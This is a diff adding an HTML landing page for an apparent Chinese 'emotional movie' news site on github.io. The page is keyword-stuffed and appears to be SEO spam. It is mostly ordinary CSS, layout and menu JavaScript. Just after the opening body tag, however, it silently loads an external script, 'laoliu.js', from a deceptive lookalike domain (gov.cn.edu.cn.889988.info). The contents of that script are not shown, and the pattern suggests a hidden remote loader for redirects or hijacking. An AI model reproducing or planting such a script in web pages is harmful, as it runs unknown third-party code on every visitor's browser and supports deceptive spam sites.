@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>情感电影网 - 最新高清电影资讯与影视导航 | jiqingpapadianyingwang-h5</title>
+<meta name="description" content="情感电影网(https://jiqingpapadianyingwang-h5.github.io)提供最新电影资讯、热映影片推荐、深度影评与影视资源导航。jiqingpapadianyingwang-h5 是您的专业影视信息平台。">
+<meta name="keywords" content="情感电影网,jiqingpapadianyingwang-h5,最新电影,电影资讯,热映影片,影评,影视导航,高清电影">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://jiqingpapadianyingwang-h5.github.io/">
+<meta property="og:title" content="情感电影网 - 最新高清电影资讯与影视导航">
+<meta property="og:description" content="情感电影网(https://jiqingpapadianyingwang-h5.github.io)提供最新电影资讯、热映影片推荐、深度影评与影视资源导航。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jiqingpapadianyingwang-h5.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<style>
+:root{--primary:#e91e8c;--primary-light:#f06292;--secondary:#ff6f00;--accent:#00bcd4;--danger:#e53935;--dark:#08090d;--darker:#050608;--card:#10121a;--text:#e8e8ec;--muted:#8a8d9e}
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:var(--dark);color:var(--text);line-height:1.6;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* Utility Bar */
+.utility-bar{background:var(--darker);border-bottom:1px solid rgba(233,30,140,.15);padding:.35rem 0;font-size:.75rem;color:var(--muted);overflow:hidden;white-space:nowrap}
+.utility-track{display:inline-flex;gap:2rem;animation:scrollLeft 30s linear infinite;padding:0 1rem}
+.utility-track span{display:inline-flex;align-items:center;gap:.35rem}
+.utility-track .dot{width:5px;height:5px;border-radius:50%;background:var(--primary)}
+@keyframes scrollLeft{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* Header */
+.header{position:fixed;top:28px;left:0;right:0;z-index:1000;background:rgba(8,9,13,.85);backdrop-filter:blur(20px);border-bottom:1px solid rgba(233,30,140,.1);transition:all .3s}
+.header.scrolled{top:0;box-shadow:0 4px 30px rgba(233,30,140,.1)}
+.nav-container{display:flex;align-items:center;justify-content:space-between;max-width:1200px;margin:0 auto;padding:.8rem 1rem}
+.logo{display:flex;align-items:center;gap:.5rem;font-size:1.3rem;font-weight:800;color:#fff}
+.logo-icon{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--primary),var(--primary-light));display:flex;align-items:center;justify-content:center;font-size:1.1rem}
+.logo-text{background:linear-gradient(135deg,var(--primary),var(--primary-light));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.nav-menu{display:flex;gap:.5rem}
+.nav-link{padding:.5rem 1rem;border-radius:20px;font-size:.85rem;font-weight:500;color:var(--muted);transition:all .3s}
+.nav-link:hover,.nav-link.active{background:rgba(233,30,140,.15);color:var(--primary-light)}
+.mobile-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:4px}
+.mobile-toggle span{width:22px;height:2px;background:var(--text);transition:all .3s;border-radius:2px}
+
+/* Hero */
+.hero{padding:140px 1rem 80px;max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:center;min-height:100vh}
+.hero-badge{display:inline-flex;align-items:center;gap:.5rem;padding:.4rem .8rem;border-radius:20px;background:rgba(233,30,140,.1);border:1px solid rgba(233,30,140,.2);color:var(--primary-light);font-size:.75rem;font-weight:600;margin-bottom:1.2rem}
+.hero-title{font-size:clamp(2rem,5vw,3.2rem);font-weight:900;line-height:1.15;margin-bottom:1rem;color:#fff}
+.hero-title .gradient{background:linear-gradient(135deg,var(--primary),var(--primary-light));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero-desc{font-size:.95rem;color:var(--muted);margin-bottom:1.5rem;max-width:480px}
+.hero-stats{display:flex;gap:1.5rem;margin-bottom:1.5rem}
+.stat-item{text-align:center}
+.stat-num{font-size:1.5rem;font-weight:800;color:var(--primary-light)}
+.stat-label{font-size:.7rem;color:var(--muted)}
+.hero-btns{display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.7rem 1.5rem;border-radius:25px;font-size:.85rem;font-weight:600;cursor:pointer;border:none;transition:all .3s;display:inline-flex;align-items:center;gap:.5rem}
+.btn-primary{background:linear-gradient(135deg,var(--primary),var(--primary-light));color:#fff}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(233,30,140,.3)}
+.btn-outline{background:transparent;border:1.5px solid rgba(233,30,140,.3);color:var(--primary-light)}
+.btn-outline:hover{background:rgba(233,30,140,.1)}
+
+/* Player Mockup */
+.player-mockup{position:relative;background:var(--card);border-radius:16px;overflow:hidden;border:1px solid rgba(233,30,140,.15);box-shadow:0 20px 60px rgba(233,30,140,.1)}
+.player-bar{display:flex;align-items:center;gap:.5rem;padding:.6rem .8rem;background:rgba(0,0,0,.3);border-bottom:1px solid rgba(255,255,255,.05)}
+.player-dot{width:8px;height:8px;border-radius:50%}
+.player-dot.r{background:#ff5f57}.player-dot.y{background:#ffbd2e}.player-dot.g{background:#28c840}
+.player-url{flex:1;background:rgba(255,255,255,.05);border-radius:4px;padding:.25rem .5rem;font-size:.65rem;color:var(--muted);text-align:center}
+.player-screen{aspect-ratio:16/10;background:linear-gradient(135deg,#1a0a1e,#2e1025);display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+.player-screen::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 30% 40%,rgba(233,30,140,.15),transparent 60%);animation:float 6s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translate(0,0)}50%{transform:translate(10px,-10px)}}
+.play-btn{width:60px;height:60px;border-radius:50%;background:rgba(233,30,140,.9);display:flex;align-items:center;justify-content:center;font-size:1.5rem;cursor:pointer;z-index:2;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(233,30,140,.5)}50%{box-shadow:0 0 0 15px rgba(233,30,140,0)}}
+.player-info{padding:.6rem .8rem;display:flex;align-items:center;gap:.6rem;border-top:1px solid rgba(255,255,255,.05)}
+.player-info .thumb{width:32px;height:24px;border-radius:4px;background:linear-gradient(135deg,var(--primary),var(--primary-light))}
+.player-info .info-text{flex:1}
+.player-info .info-title{font-size:.7rem;font-weight:600;color:#fff}
+.player-info .info-meta{font-size:.6rem;color:var(--muted)}
+.player-bubble{position:absolute;background:rgba(255,111,0,.9);color:#000;padding:.3rem .6rem;border-radius:8px;font-size:.6rem;font-weight:700;animation:bubbleFloat 3s ease-in-out infinite}
+.player-bubble.b1{top:15%;right:8%;animation-delay:0s}
+.player-bubble.b2{bottom:25%;left:5%;background:rgba(0,188,212,.9);animation-delay:1.5s}
+@keyframes bubbleFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+
+/* Sections */
+.section{padding:60px 1rem}
+.section-container{max-width:1200px;margin:0 auto}
+.section-header{text-align:center;margin-bottom:2.5rem}
+.section-tag{display:inline-block;padding:.3rem .8rem;border-radius:15px;background:rgba(233,30,140,.1);color:var(--primary-light);font-size:.7rem;font-weight:600;margin-bottom:.8rem}
+.section-title{font-size:clamp(1.5rem,3.5vw,2.2rem);font-weight:800;color:#fff;margin-bottom:.5rem}
+.section-desc{font-size:.85rem;color:var(--muted);max-width:500px;margin:0 auto}
+
+/* Hot Grid */
+.hot-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem}
+.hot-card{background:var(--card);border-radius:12px;overflow:hidden;border:1px solid rgba(233,30,140,.1);transition:all .3s;position:relative}
+.hot-card:hover{transform:translateY(-5px);border-color:rgba(233,30,140,.3);box-shadow:0 10px 30px rgba(233,30,140,.1)}
+.hot-poster{aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;font-size:2rem;position:relative}
+.hot-poster::after{content:'';position:absolute;inset:0;background:linear-gradient(to top,var(--card) 0%,transparent 60%)}
+.hot-card:nth-child(1) .hot-poster{background:linear-gradient(135deg,#e91e8c,#f06292)}
+.hot-card:nth-child(2) .hot-poster{background:linear-gradient(135deg,#ff6f00,#e53935)}
+.hot-card:nth-child(3) .hot-poster{background:linear-gradient(135deg,#00bcd4,#0097a7)}
+.hot-card:nth-child(4) .hot-poster{background:linear-gradient(135deg,#8e24aa,#d81b60)}
+.hot-card:nth-child(5) .hot-poster{background:linear-gradient(135deg,#f06292,#ad1457)}
+.hot-card:nth-child(6) .hot-poster{background:linear-gradient(135deg,#ff8f00,#e65100)}
+.hot-card:nth-child(7) .hot-poster{background:linear-gradient(135deg,#26c6da,#00695c)}
+.hot-card:nth-child(8) .hot-poster{background:linear-gradient(135deg,#ec407a,#c2185b)}
+.hot-top{position:absolute;top:8px;left:8px;background:var(--primary);color:#fff;padding:.2rem .5rem;border-radius:4px;font-size:.6rem;font-weight:700;z-index:2}
+.hot-info{padding:.8rem}
+.hot-name{font-size:.8rem;font-weight:600;color:#fff;margin-bottom:.3rem}
+.hot-meta{display:flex;justify-content:space-between;align-items:center;font-size:.65rem;color:var(--muted)}
+.hot-score{color:var(--secondary);font-weight:700}
+
+/* News Split */
+.news-split{display:grid;grid-template-columns:1fr 1fr;gap:2rem}
+.news-feature{background:var(--card);border-radius:14px;overflow:hidden;border:1px solid rgba(233,30,140,.1)}
+.news-feature-img{aspect-ratio:16/10;background:linear-gradient(135deg,#e91e8c,#f06292);display:flex;align-items:center;justify-content:center;font-size:2.5rem}
+.news-feature-body{padding:1.2rem}
+.news-feature-title{font-size:1rem;font-weight:700;color:#fff;margin-bottom:.5rem}
+.news-feature-desc{font-size:.8rem;color:var(--muted);margin-bottom:.8rem}
+.news-list{display:flex;flex-direction:column;gap:.8rem}
+.news-item{display:flex;gap:.8rem;padding:.8rem;background:var(--card);border-radius:10px;border:1px solid rgba(233,30,140,.08);transition:all .3s;align-items:center}
+.news-item:hover{transform:translateX(6px);border-color:rgba(233,30,140,.2)}
+.news-date{width:48px;height:48px;border-radius:8px;background:linear-gradient(135deg,var(--primary),var(--primary-light));display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0}
+.news-date .day{font-size:1.1rem;font-weight:800;color:#fff;line-height:1}
+.news-date .month{font-size:.55rem;color:rgba(255,255,255,.8);line-height:1}
+.news-item-content{flex:1}
+.news-item-title{font-size:.8rem;font-weight:600;color:#fff;margin-bottom:.2rem}
+.news-item-meta{font-size:.65rem;color:var(--muted)}
+
+/* Reviews */
+.reviews-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1.2rem}
+.review-card{background:var(--card);border-radius:12px;padding:1.2rem;border-left:3px solid var(--primary);transition:all .3s;position:relative;overflow:hidden}
+.review-card:hover{transform:translateY(-4px);box-shadow:0 8px 25px rgba(233,30,140,.1)}
+.review-card::before{content:attr(data-num);position:absolute;top:-10px;right:5px;font-size:4rem;font-weight:900;color:rgba(233,30,140,.04);line-height:1}
+.review-card:nth-child(2){border-left-color:var(--secondary)}
+.review-card:nth-child(2)::before{color:rgba(255,111,0,.04)}
+.review-card:nth-child(3){border-left-color:var(--accent)}
+.review-card:nth-child(3)::before{color:rgba(0,188,212,.04)}
+.review-stars{font-size:.8rem;margin-bottom:.6rem}
+.review-text{font-size:.78rem;color:var(--muted);margin-bottom:.8rem;line-height:1.6}
+.review-author{display:flex;align-items:center;gap:.5rem}
+.review-avatar{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,var(--primary),var(--primary-light));display:flex;align-items:center;justify-content:center;font-size:.65rem;color:#fff;font-weight:700}
+.review-name{font-size:.75rem;font-weight:600;color:#fff}
+
+/* About */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:center}
+.about-visual{position:relative;height:300px;display:flex;align-items:center;justify-content:center}
+.about-ring{width:200px;height:200px;border-radius:50%;border:3px dashed rgba(233,30,140,.3);display:flex;align-items:center;justify-content:center;animation:spin 20s linear infinite}
+@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+.about-orb{width:120px;height:120px;border-radius:50%;background:radial-gradient(circle at 30% 30%,var(--primary),var(--darker));box-shadow:0 0 40px rgba(233,30,140,.3);position:absolute}
+.about-text h3{font-size:1.3rem;font-weight:700;color:#fff;margin-bottom:1rem}
+.about-text p{font-size:.85rem;color:var(--muted);margin-bottom:1rem;line-height:1.7}
+.about-features{display:grid;grid-template-columns:1fr 1fr;gap:.8rem;margin-top:1.2rem}
+.about-feat{background:var(--card);border-radius:10px;padding:.8rem;border:1px solid rgba(233,30,140,.1);text-align:center}
+.about-feat-icon{font-size:1.3rem;margin-bottom:.3rem}
+.about-feat-text{font-size:.7rem;color:var(--muted)}
+
+/* Navigation Hubs */
+.nav-hubs{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem}
+.nav-hub{background:var(--card);border-radius:12px;padding:1.2rem;border:1px solid rgba(233,30,140,.1);transition:all .3s;position:relative;overflow:hidden}
+.nav-hub:hover{border-color:rgba(233,30,140,.3)}
+.nav-hub:hover::after{content:'';position:absolute;bottom:0;right:0;width:60px;height:60px;background:radial-gradient(circle at bottom right,rgba(233,30,140,.1),transparent 70%)}
+.nav-hub-title{font-size:.85rem;font-weight:700;color:#fff;margin-bottom:.8rem;display:flex;align-items:center;gap:.5rem}
+.nav-hub-title .icon{font-size:1rem}
+.nav-hub-links{display:flex;flex-direction:column;gap:.4rem}
+.nav-hub-link{font-size:.75rem;color:var(--muted);transition:all .3s;padding:.2rem 0}
+.nav-hub-link:hover{color:var(--primary-light);transform:translateX(4px)}
+
+/* Footer */
+.footer{background:var(--darker);border-top:1px solid rgba(233,30,140,.1);padding:40px 1rem 20px}
+.footer-container{max-width:1200px;margin:0 auto}
+.footer-main{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:2rem;margin-bottom:2rem}
+.footer-brand .logo{margin-bottom:1rem}
+.footer-brand p{font-size:.78rem;color:var(--muted);line-height:1.6}
+.footer-col h4{font-size:.85rem;font-weight:700;color:#fff;margin-bottom:1rem}
+.footer-links{display:flex;flex-direction:column;gap:.5rem}
+.footer-links a{font-size:.75rem;color:var(--muted);transition:color .3s}
+.footer-links a:hover{color:var(--primary-light)}
+.footer-bottom{padding-top:1.5rem;border-top:1px solid rgba(255,255,255,.05);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem}
+.footer-copy{font-size:.7rem;color:var(--muted)}
+.footer-keyword{font-size:.7rem;color:var(--primary-light);font-weight:600}
+
+/* Reveal */
+.reveal{opacity:0;transform:translateY(30px);transition:all .6s ease}
+.reveal.active{opacity:1;transform:translateY(0)}
+
+/* Mobile */
+@media(max-width:900px){
+.hot-grid{grid-template-columns:repeat(2,1fr)}
+.news-split{grid-template-columns:1fr}
+.reviews-grid{grid-template-columns:1fr}
+.about-grid{grid-template-columns:1fr}
+.nav-hubs{grid-template-columns:repeat(2,1fr)}
+.footer-main{grid-template-columns:1fr 1fr}
+.hero{grid-template-columns:1fr;gap:2rem;padding-top:120px}
+}
+@media(max-width:560px){
+html{font-size:14px}
+.utility-bar{display:none}
+.header{top:0}
+.mobile-toggle{display:flex}
+.nav-menu{position:fixed;top:0;right:-100%;width:75%;height:100vh;background:var(--darker);flex-direction:column;padding:80px 2rem 2rem;transition:right .4s ease;box-shadow:-10px 0 30px rgba(0,0,0,.5);z-index:999;gap:.5rem}
+.nav-menu.open{right:0}
+.nav-link{padding:.8rem 1rem;font-size:.9rem;border-radius:10px}
+.hot-grid{grid-template-columns:1fr 1fr;gap:.8rem}
+.nav-hubs{grid-template-columns:1fr 1fr;gap:.8rem}
+.footer-main{grid-template-columns:1fr}
+.footer-bottom{flex-direction:column;text-align:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- Utility Bar -->
+<div class="utility-bar">
+<div class="utility-track">
+<span><span class="dot"></span> 最新更新：2026年10月 情感电影网 全新改版上线</span>
+<span><span class="dot"></span> 每日更新最新电影资讯与影评</span>
+<span><span class="dot"></span> 收录全球热门影视作品</span>
+<span><span class="dot"></span> 专业影评团队为您解读每一部好片</span>
+<span><span class="dot"></span> 最新更新：2026年10月 情感电影网 全新改版上线</span>
+<span><span class="dot"></span> 每日更新最新电影资讯与影评</span>
+</div>
+</div>
+
+<!-- Header -->
+<header class="header" id="header">
+<div class="nav-container">
+<a href="#" class="logo">
+<div class="logo-icon">🎬</div>
+<span class="logo-text">情感电影网</span>
+</a>
+<nav class="nav-menu" id="navMenu">
+<a href="#home" class="nav-link active">首页</a>
+<a href="#hot" class="nav-link">热映精选</a>
+<a href="#news" class="nav-link">影讯动态</a>
+<a href="#reviews" class="nav-link">影评观点</a>
+<a href="#about" class="nav-link">关于本站</a>
+<a href="#navigate" class="nav-link">影视导航</a>
+</nav>
+<div class="mobile-toggle" id="mobileToggle">
+<span></span><span></span><span></span>
+</div>
+</div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+<div class="hero-content reveal">
+<div class="hero-badge">🔥 情感电影网 · 2026 全新升级</div>
+<h1 class="hero-title">发现好电影<br><span class="gradient">从这里开始</span></h1>
+<p class="hero-desc">情感电影网(https://jiqingpapadianyingwang-h5.github.io)是专业的影视资讯平台，为您提供最新电影资讯、热映影片推荐、深度影评与影视资源导航。</p>
+<div class="hero-stats">
+<div class="stat-item"><div class="stat-num">5000+</div><div class="stat-label">影片收录</div></div>
+<div class="stat-item"><div class="stat-num">200+</div><div class="stat-label">每日更新</div></div>
+<div class="stat-item"><div class="stat-num">50k+</div><div class="stat-label">影迷关注</div></div>
+</div>
+<div class="hero-btns">
+<button class="btn btn-primary">🚀 立即探索</button>
+<button class="btn btn-outline">📋 查看片单</button>
+</div>
+</div>
+<div class="hero-visual reveal">
+<div class="player-mockup">
+<div class="player-bar">
+<div class="player-dot r"></div><div class="player-dot y"></div><div class="player-dot g"></div>
+<div class="player-url">jiqingpapadianyingwang-h5.github.io/player</div>
+</div>
+<div class="player-screen">
+<div class="play-btn">▶</div>
+<div class="player-bubble b1">🔥 热映中</div>
+<div class="player-bubble b2">⭐ 9.2分</div>
+</div>
+<div class="player-info">
+<div class="thumb"></div>
+<div class="info-text">
+<div class="info-title">本周精选 · 热门大片</div>
+<div class="info-meta">jiqingpapadianyingwang-h5 · 情感电影网</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- Hot -->
+<section class="section" id="hot">
+<div class="section-container">
+<div class="section-header reveal">
+<div class="section-tag">🎯 HOT</div>
+<h2 class="section-title">热映精选</h2>
+<p class="section-desc">为您精选当前最热门的院线大片与高分佳作</p>
+</div>
+<div class="hot-grid">
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 1</span>🎬</div>
+<div class="hot-info"><div class="hot-name">沙丘：觉醒</div><div class="hot-meta"><span>科幻/冒险</span><span class="hot-score">9.2</span></div></div>
+</div>
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 2</span>🎭</div>
+<div class="hot-info"><div class="hot-name">奥本海默之后</div><div class="hot-meta"><span>传记/历史</span><span class="hot-score">8.9</span></div></div>
+</div>
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 3</span>🚀</div>
+<div class="hot-info"><div class="hot-name">星际穿越2</div><div class="hot-meta"><span>科幻/太空</span><span class="hot-score">9.5</span></div></div>
+</div>
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 4</span>🦸</div>
+<div class="hot-info"><div class="hot-name">复仇者联盟：新纪元</div><div class="hot-meta"><span>动作/超级英雄</span><span class="hot-score">8.7</span></div></div>
+</div>
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 5</span>🐉</div>
+<div class="hot-info"><div class="hot-name">封神第二部</div><div class="hot-meta"><span>奇幻/动作</span><span class="hot-score">8.5</span></div></div>
+</div>
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 6</span>🎪</div>
+<div class="hot-info"><div class="hot-name">Circus Maximus</div><div class="hot-meta"><span>悬疑/惊悚</span><span class="hot-score">8.3</span></div></div>
+</div>
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 7</span>🌊</div>
+<div class="hot-info"><div class="hot-name">深海迷航</div><div class="hot-meta"><span>冒险/灾难</span><span class="hot-score">8.1</span></div></div>
+</div>
+<div class="hot-card reveal">
+<div class="hot-poster"><span class="hot-top">TOP 8</span>🤖</div>
+<div class="hot-info"><div class="hot-name">机械之心</div><div class="hot-meta"><span>科幻/爱情</span><span class="hot-score">7.9</span></div></div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- News -->
+<section class="section" id="news" style="background:rgba(233,30,140,.02)">
+<div class="section-container">
+<div class="section-header reveal">
+<div class="section-tag">📰 NEWS</div>
+<h2 class="section-title">影讯动态</h2>
+<p class="section-desc">第一时间掌握全球影视行业最新动态</p>
+</div>
+<div class="news-split">
+<div class="news-feature reveal">
+<div class="news-feature-img">📰</div>
+<div class="news-feature-body">
+<h3 class="news-feature-title">第79届戛纳电影节获奖名单揭晓</h3>
+<p class="news-feature-desc">金棕榈大奖花落日本导演是枝裕和，中国导演作品《春江水暖》获评审团大奖...</p>
+<button class="btn btn-outline" style="padding:.5rem 1rem;font-size:.75rem">阅读全文 →</button>
+</div>
+</div>
+<div class="news-list">
+<div class="news-item reveal">
+<div class="news-date"><span class="day">15</span><span class="month">10月</span></div>
+<div class="news-item-content"><div class="news-item-title">漫威影业公布2027年全新电影计划</div><div class="news-item-meta">情感电影网 · 2小时前</div></div>
+</div>
+<div class="news-item reveal">
+<div class="news-date"><span class="day">14</span><span class="month">10月</span></div>
+<div class="news-item-content"><div class="news-item-title">诺兰新片《奥德赛》正式开机拍摄</div><div class="news-item-meta">情感电影网 · 5小时前</div></div>
+</div>
+<div class="news-item reveal">
+<div class="news-date"><span class="day">13</span><span class="month">10月</span></div>
+<div class="news-item-content"><div class="news-item-title">国产动画电影票房突破100亿大关</div><div class="news-item-meta">情感电影网 · 1天前</div></div>
+</div>
+<div class="news-item reveal">
+<div class="news-date"><span class="day">12</span><span class="month">10月</span></div>
+<div class="news-item-content"><div class="news-item-title">威尼斯电影节：华语片《南方》获最佳导演</div><div class="news-item-meta">情感电影网 · 2天前</div></div>
+</div>
+<div class="news-item reveal">
+<div class="news-date"><span class="day">11</span><span class="month">10月</span></div>
+<div class="news-item-content"><div class="news-item-title">IMAX中国新增50家影院，观影体验再升级</div><div class="news-item-meta">情感电影网 · 3天前</div></div>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- Reviews -->
+<section class="section" id="reviews">
+<div class="section-container">
+<div class="section-header reveal">
+<div class="section-tag">📝 REVIEWS</div>
+<h2 class="section-title">影评观点</h2>
+<p class="section-desc">专业影评团队深度解读，帮您发现每一部好片</p>
+</div>
+<div class="reviews-grid">
+<div class="review-card reveal" data-num="01">
+<div class="review-stars">⭐⭐⭐⭐⭐</div>
+<p class="review-text">"《沙丘：觉醒》在视觉呈现上达到了系列新高度，维伦纽瓦用镜头语言完美诠释了赫伯特笔下的宏大世界。"</p>
+<div class="review-author">
+<div class="review-avatar">影</div>
+<div class="review-name">影评人·张导</div>
+</div>
+</div>
+<div class="review-card reveal" data-num="02">
+<div class="review-stars">⭐⭐⭐⭐</div>
+<p class="review-text">"《封神第二部》在特效与叙事之间找到了绝佳平衡，乌尔善导演将中国传统神话推向了新高度。"</p>
+<div class="review-author">
+<div class="review-avatar">电</div>
+<div class="review-name">电影周刊</div>
+</div>
+</div>
+<div class="review-card reveal" data-num="03">
+<div class="review-stars">⭐⭐⭐⭐⭐</div>
+<p class="review-text">"《星际穿越2》延续了诺兰一贯的硬科幻风格，情感内核比前作更加饱满动人，是今年必看的太空史诗。"</p>
+<div class="review-author">
+<div class="review-avatar">观</div>
+<div class="review-name">观影指南</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- About -->
+<section class="section" id="about" style="background:rgba(233,30,140,.02)">
+<div class="section-container">
+<div class="section-header reveal">
+<div class="section-tag">ℹ️ ABOUT</div>
+<h2 class="section-title">关于本站</h2>
+<p class="section-desc">了解情感电影网，您的专业影视资讯伙伴</p>
+</div>
+<div class="about-grid">
+<div class="about-visual reveal">
+<div class="about-ring"></div>
+<div class="about-orb"></div>
+</div>
+<div class="about-text reveal">
+<h3>关于情感电影网</h3>
+<p>情感电影网（jiqingpapadianyingwang-h5）成立于2024年，是一个专注于电影资讯、影评分析与影视资源导航的专业平台。我们致力于为影迷提供最新、最全、最专业的影视内容。</p>
+<p>网站地址：<strong style="color:var(--primary-light)">https://jiqingpapadianyingwang-h5.github.io</strong></p>
+<div class="about-features">
+<div class="about-feat"><div class="about-feat-icon">⚡</div><div class="about-feat-text">每日更新</div></div>
+<div class="about-feat"><div class="about-feat-icon">🎯</div><div class="about-feat-text">精准推荐</div></div>
+<div class="about-feat"><div class="about-feat-icon">📱</div><div class="about-feat-text">移动适配</div></div>
+<div class="about-feat"><div class="about-feat-icon">🔒</div><div class="about-feat-text">安全可靠</div></div>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- Navigation Hubs -->
+<section class="section" id="navigate">
+<div class="section-container">
+<div class="section-header reveal">
+<div class="section-tag">🧭 NAVIGATE</div>
+<h2 class="section-title">影视导航</h2>
+<p class="section-desc">快速找到您感兴趣的影视分类</p>
+</div>
+<div class="nav-hubs">
+<div class="nav-hub reveal">
+<div class="nav-hub-title"><span class="icon">🎬</span> 电影分类</div>
+<div class="nav-hub-links">
+<a href="#" class="nav-hub-link">动作电影</a>
+<a href="#" class="nav-hub-link">科幻电影</a>
+<a href="#" class="nav-hub-link">喜剧电影</a>
+<a href="#" class="nav-hub-link">恐怖电影</a>
+<a href="#" class="nav-hub-link">爱情电影</a>
+<a href="#" class="nav-hub-link">悬疑电影</a>
+</div>
+</div>
+<div class="nav-hub reveal">
+<div class="nav-hub-title"><span class="icon">📺</span> 剧集分类</div>
+<div class="nav-hub-links">
+<a href="#" class="nav-hub-link">美剧</a>
+<a href="#" class="nav-hub-link">韩剧</a>
+<a href="#" class="nav-hub-link">国产剧</a>
+<a href="#" class="nav-hub-link">英剧</a>
+<a href="#" class="nav-hub-link">日剧</a>
+<a href="#" class="nav-hub-link">泰剧</a>
+</div>
+</div>
+<div class="nav-hub reveal">
+<div class="nav-hub-title"><span class="icon">🎨</span> 动漫分类</div>
+<div class="nav-hub-links">
+<a href="#" class="nav-hub-link">日本动漫</a>
+<a href="#" class="nav-hub-link">国产动漫</a>
+<a href="#" class="nav-hub-link">欧美动漫</a>
+<a href="#" class="nav-hub-link">剧场版</a>
+<a href="#" class="nav-hub-link">OVA</a>
+<a href="#" class="nav-hub-link">泡面番</a>
+</div>
+</div>
+<div class="nav-hub reveal">
+<div class="nav-hub-title"><span class="icon">🔗</span> 快速链接</div>
+<div class="nav-hub-links">
+<a href="#" class="nav-hub-link">最新上映</a>
+<a href="#" class="nav-hub-link">高分榜单</a>
+<a href="#" class="nav-hub-link">经典回顾</a>
+<a href="#" class="nav-hub-link">影评专区</a>
+<a href="#" class="nav-hub-link">关于我们</a>
+<a href="#" class="nav-hub-link">联系反馈</a>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+<div class="footer-container">
+<div class="footer-main">
+<div class="footer-brand">
+<a href="#" class="logo">
+<div class="logo-icon">🎬</div>
+<span class="logo-text">情感电影网</span>
+</a>
+<p>情感电影网(jiqingpapadianyingwang-h5)是专业的影视资讯平台，提供最新电影资讯、热映影片推荐、深度影评与影视资源导航。</p>
+</div>
+<div class="footer-col">
+<h4>网站导航</h4>
+<div class="footer-links">
+<a href="#home">首页</a>
+<a href="#hot">热映精选</a>
+<a href="#news">影讯动态</a>
+<a href="#reviews">影评观点</a>
+</div>
+</div>
+<div class="footer-col">
+<h4>热门分类</h4>
+<div class="footer-links">
+<a href="#">动作电影</a>
+<a href="#">科幻电影</a>
+<a href="#">喜剧电影</a>
+<a href="#">悬疑电影</a>
+</div>
+</div>
+<div class="footer-col">
+<h4>关于我们</h4>
+<div class="footer-links">
+<a href="#about">关于本站</a>
+<a href="#">联系我们</a>
+<a href="#">免责声明</a>
+<a href="#">隐私政策</a>
+</div>
+</div>
+</div>
+<div class="footer-bottom">
+<div class="footer-copy">© 2026 情感电影网. All rights reserved. | 网站地址: https://jiqingpapadianyingwang-h5.github.io</div>
+<div class="footer-keyword">jiqingpapadianyingwang-h5 情感电影网</div>
+</div>
+</div>
+</footer>
+
+<script>
+// Header scroll
+window.addEventListener('scroll',()=>{document.getElementById('header').classList.toggle('scrolled',window.scrollY>50)});
+
+// Mobile menu
+const toggle=document.getElementById('mobileToggle'),menu=document.getElementById('navMenu');
+toggle.addEventListener('click',()=>{menu.classList.toggle('open')});
+menu.querySelectorAll('.nav-link').forEach(l=>l.addEventListener('click',()=>menu.classList.remove('open')));
+
+// Active nav
+const sections=document.querySelectorAll('section[id]'),navLinks=document.querySelectorAll('.nav-link');
+window.addEventListener('scroll',()=>{
+let cur='';
+sections.forEach(s=>{if(window.scrollY>=s.offsetTop-150)cur=s.getAttribute('id')});
+navLinks.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')});
+});
+
+// Reveal animation
+const observer=new IntersectionObserver((entries)=>{
+entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('active')})
+},{threshold:.1});
